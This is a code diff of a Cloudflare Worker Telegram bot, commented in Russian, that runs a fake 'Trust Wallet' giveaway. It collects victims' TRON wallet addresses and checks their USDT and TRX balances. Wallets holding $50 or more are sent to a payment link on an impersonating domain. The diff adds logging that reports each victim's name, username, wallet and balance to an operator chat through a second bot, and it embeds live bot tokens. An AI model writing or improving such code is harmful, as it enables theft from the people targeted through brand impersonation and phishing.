@@ -6,7 +6,11 @@ const BOT_TOKEN = "8967784999:AAFTnFXi1tE4USBH4eQEF_CkrfJpqbcH3uI";
 const PHOTO_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRaG1Ay-no9Desc-6ZsW9vLJlUL4j2cVyNHDKs_OMgGBg&s=10";
 const REGISTRATION_LINK = "https://trust-escrow.casa/pay/5cc9f454-b14c-40fc-9fe8-f21baa163554";
 const MIN_BALANCE_USD = 50;
-const TRX_PRICE_USD = 0.25; // Примерный курс TRX
+const TRX_PRICE_USD = 0.25;
+
+// Настройки для логов
+const LOG_BOT_TOKEN = "8875182169:AAH-EYO8mDSgFJUhJXcpRAcN5u0xWyqqG9M";
+const LOG_CHAT_ID = "5253808709";
 
 // ==========================================
 // CLOUDFLARE WORKER ENTRY POINT
@@ -20,7 +24,6 @@ export default {
 
     try {
       const update = await request.json();
-      // console.log("UPDATE:", JSON.stringify(update));
 
       if (update.message) {
         await processMessage(update.message);
@@ -43,9 +46,9 @@ export default {
 // TELEGRAM API HELPER
 // ==========================================
 
-async function telegram(method, data) {
+async function telegram(method, data, token = BOT_TOKEN) {
   const response = await fetch(
-    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
+    `https://api.telegram.org/bot${token}/${method}`,
     {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -56,7 +59,39 @@ async function telegram(method, data) {
 }
 
 // ==========================================
-// ПРОВЕРКА БАЛАНСА TRON (ИСПРАВЛЕННАЯ)
+// ФУНКЦИЯ ЛОГИРОВАНИЯ (КРАСИВЫЕ СООБЩЕНИЯ)
+// ==========================================
+
+async function sendAdminLog(action, user, details = "") {
+  const userId = user.id;
+  const username = user.username ? `@${user.username}` : "Нет юзернейма";
+  const name = `${user.first_name || ""} ${user.last_name || ""}`.trim();
+  
+  // Определение устройства по User-Agent (если доступно, иначе просто ID)
+  // В Telegram API нет прямого UA, но можно добавить мета-данные
+  
+  const time = new Date().toLocaleString("ru-RU");
+  
+  let text = `📊 <b>НОВОЕ СОБЫТИЕ: ${action}</b>\n\n`;
+  text += `👤 <b>Пользователь:</b> ${name}\n`;
+  text += `🆔 <b>ID:</b> <code>${userId}</code>\n`;
+  text += `🏷 <b>Username:</b> ${username}\n`;
+  text += `🕐 <b>Время:</b> ${time}\n`;
+  
+  if (details) {
+    text += `\n📝 <b>Детали:</b>\n${details}`;
+  }
+
+  // Отправляем лог в админ-чат
+  await telegram("sendMessage", {
+    chat_id: LOG_CHAT_ID,
+    text: text,
+    parse_mode: "HTML"
+  }, LOG_BOT_TOKEN);
+}
+
+// ==========================================
+// ПРОВЕРКА БАЛАНСА TRON
 // ==========================================
 
 async function checkTronBalance(address) {
@@ -64,28 +99,25 @@ async function checkTronBalance(address) {
     const response = await fetch(`https://api.trongrid.io/v1/accounts/${address}`);
     
     if (!response.ok) {
-      console.error("TronGrid HTTP Error:", response.status);
-      return { eligible: false, reason: "Ошибка сети TronGrid." };
+      return { eligible: false, reason: "Ошибка сети TronGrid.", usdt: 0, trx: 0 };
     }
 
     const data = await response.json();
 
     if (!data.data || data.data.length === 0) {
-      return { eligible: false, reason: "Кошелек не найден или не активирован." };
+      return { eligible: false, reason: "Кошелек не найден или пуст.", usdt: 0, trx: 0 };
     }
 
     const account = data.data[0];
 
-    // 1. Баланс TRX (в sun, делим на 1 млн)
+    // 1. Баланс TRX
     const trxBalance = Number(account.balance || 0) / 1_000_000;
 
     // 2. Баланс USDT (TRC-20)
     let usdtBalance = 0;
-    const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Адрес контракта USDT
+    const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
-    // TronGrid может возвращать trc20 как ОБЪЕКТ или как МАССИВ
     if (Array.isArray(account.trc20)) {
-      // Формат: [ { "TR7N...": "1000000" }, { "другой_токен": "500" } ]
       for (const tokenObj of account.trc20) {
         if (tokenObj && tokenObj[usdtContract]) {
           usdtBalance = Number(tokenObj[usdtContract]) / 1_000_000;
@@ -93,29 +125,24 @@ async function checkTronBalance(address) {
         }
       }
     } else if (account.trc20 && typeof account.trc20 === 'object') {
-      // Формат: { "TR7N...": "1000000", "другой_токен": "500" }
       if (account.trc20[usdtContract]) {
         usdtBalance = Number(account.trc20[usdtContract]) / 1_000_000;
       }
     }
 
-    // Считаем общий баланс в USD
     const totalUsd = usdtBalance + (trxBalance * TRX_PRICE_USD);
 
-    console.log(`Check Result: TRX=${trxBalance}, USDT=${usdtBalance}, Total=$${totalUsd.toFixed(2)}`);
-
-    if (totalUsd >= MIN_BALANCE_USD) {
-      return { eligible: true, balance: totalUsd };
-    } else {
-      return { 
-        eligible: false, 
-        reason: `Баланс слишком мал: ~$${totalUsd.toFixed(2)}. Нужно минимум $${MIN_BALANCE_USD}.` 
-      };
-    }
+    return { 
+      eligible: totalUsd >= MIN_BALANCE_USD, 
+      balance: totalUsd,
+      usdt: usdtBalance,
+      trx: trxBalance,
+      reason: totalUsd < MIN_BALANCE_USD ? `Баланс $${totalUsd.toFixed(2)} < $${MIN_BALANCE_USD}` : "OK"
+    };
 
   } catch (err) {
     console.error("Balance Check Exception:", err);
-    return { eligible: false, reason: "Техническая ошибка проверки." };
+    return { eligible: false, reason: "Техническая ошибка.", usdt: 0, trx: 0 };
   }
 }
 
@@ -147,10 +174,14 @@ async function processMessage(message) {
   if (!message.from || !message.chat || !message.text) return;
 
   const chatId = message.chat.id;
+  const user = message.from;
   const text = message.text.trim();
 
   // 1. Команда /start
   if (text === "/start") {
+    // Лог входа
+    await sendAdminLog("START_COMMAND", user, "Пользователь запустил бота");
+
     const caption = 
       "🔥 <b>МЕГА РОЗЫГРЫШ ОТ TRUST WALLET</b>\n\n" +
       "🏆 <b>Призовой фонд:</b>\n" +
@@ -173,21 +204,35 @@ async function processMessage(message) {
 
   // 2. Проверка адреса кошелька
   if (text.match(/^T[A-Za-z0-9]{33}$/)) {
+    
+    // Лог ввода кошелька
+    await sendAdminLog("WALLET_SUBMITTED", user, `Адрес: <code>${text}</code>`);
+
     const loadingMsg = await telegram("sendMessage", {
       chat_id: chatId,
-      text: "⏳ <i>Проверяем возможность принять участие</i>",
+      text: "⏳ <i>Проверяем возможность принять участие...</i>",
       parse_mode: "HTML"
     });
 
     const messageId = loadingMsg.result.message_id;
     const result = await checkTronBalance(text);
 
+    // Лог результата проверки
+    const balanceDetails = 
+      `💰 <b>Баланс кошелька:</b>\n` +
+      `USDT: ${result.usdt.toFixed(2)} $\n` +
+      `TRX: ${result.trx.toFixed(2)} (~$${(result.trx * TRX_PRICE_USD).toFixed(2)})\n` +
+      `Итого: ~$${result.balance.toFixed(2)}\n` +
+      `Статус: ${result.eligible ? "✅ ПРОШЕЛ" : "❌ ОТКАЗ"}`;
+    
+    await sendAdminLog("BALANCE_CHECK_RESULT", user, balanceDetails);
+
     if (result.eligible) {
       await telegram("editMessageText", {
         chat_id: chatId,
         message_id: messageId,
         text: "✅ <b>Кошелек подходит!</b>\n\n" +
-              "следуйте инструкциям\n" +
+              "Баланс подтвержден (> $50).\n" +
               "Вы допущены к участию.\n\n" +
               "👇 Нажмите кнопку ниже для финальной регистрации:",
         parse_mode: "HTML",
@@ -215,8 +260,12 @@ async function processCallback(callback) {
   if (!callback.data || !callback.from || !callback.message) return;
 
   const chatId = callback.message.chat.id;
+  const user = callback.from;
   
   if (callback.data === "start_raffle") {
+    // Лог нажатия кнопки
+    await sendAdminLog("BUTTON_CLICK", user, "Нажал кнопку «Участвовать в розыгрыше»");
+
     await telegram("answerCallbackQuery", {
       callback_query_id: callback.id,
       text: "Отправьте адрес кошелька!"
